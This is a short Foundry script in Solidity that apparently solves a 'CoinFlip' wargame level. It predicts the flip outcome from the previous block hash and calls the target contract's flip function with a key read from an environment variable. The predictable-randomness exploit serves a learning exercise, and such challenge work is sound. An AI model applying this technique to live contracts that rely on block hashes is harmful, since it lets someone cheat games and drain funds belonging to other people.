// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src//Script.sol";
import "../../lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol";
import {CoinFlip} from "../src/L4__CoinFlip.sol";

// This is a coin flipping game where you need to build up your winning
// streak by guessing the outcome of a coin flip. To complete this level
// you'll need to use your psychic abilities to guess the correct outcome
// 10 times in a row.

contract L4_Solution__CoinFlip is Script {
    CoinFlip public coinflip =
        CoinFlip(0x8BF3f3f13cc3423064b20c48f3C3f74bc85123Ac);

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 consecutiveWins;

    function run() public {
        winFlip();

        console.log(coinflip.consecutiveWins());
    }

    function winFlip() public returns (bool) {
        uint256 _robber = vm.envUint("PRIV_KEY");

        vm.startBroadcast(_robber);

        uint256 _blockValue = uint256(blockhash(block.number - 1));
        uint256 _coinFlip = _blockValue / FACTOR;
        bool _side = _coinFlip == 1 ? true : false;

        bool _results = coinflip.flip(_side);

        vm.stopBroadcast();

        return _results;
    }
}
